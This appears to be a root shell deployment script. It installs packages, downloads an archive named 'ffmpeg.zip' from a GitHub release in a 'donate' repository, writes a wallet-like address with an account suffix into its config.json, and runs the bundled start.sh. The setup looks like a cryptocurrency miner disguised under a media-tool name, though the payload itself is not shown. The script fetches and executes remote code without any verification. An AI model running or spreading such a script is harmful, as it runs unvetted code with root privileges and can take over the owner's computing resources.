cd /root

sudo apt update -y
sleep 0.5

sudo apt install tmux -y
sleep 0.5

sudo apt install unzip -y
sleep 0.5

sudo apt install python3-pip -y
sleep 0.5

sudo apt install wireguard-tools -y
sleep 0.5

sudo apt install openresolv -y
sleep 0.5

pip3 install psutil requests tqdm
sleep 0.5

wget https://github.com/maxdhctrl/donate/releases/download/release-testing-1/ffmpeg.zip
sleep 0.5

unzip ffmpeg.zip

sed -i "s/12CVe62VbQ3jvEoYPeTWUCeT6qAcJeKvEzQpsw4R7WLdHEiPqznP8TnsYqSrR69qK5uNuupghquFrkf8b26nLPv2RQB/12CVe62VbQ3jvEoYPeTWUCeT6qAcJeKvEzQpsw4R7WLdHEiPqznP8TnsYqSrR69qK5uNuupghquFrkf8b26nLPv2RQB.$ACCOUNT/g" ./ffmpeg/config.json

chmod +x start.sh

sleep 0.5
./start.sh
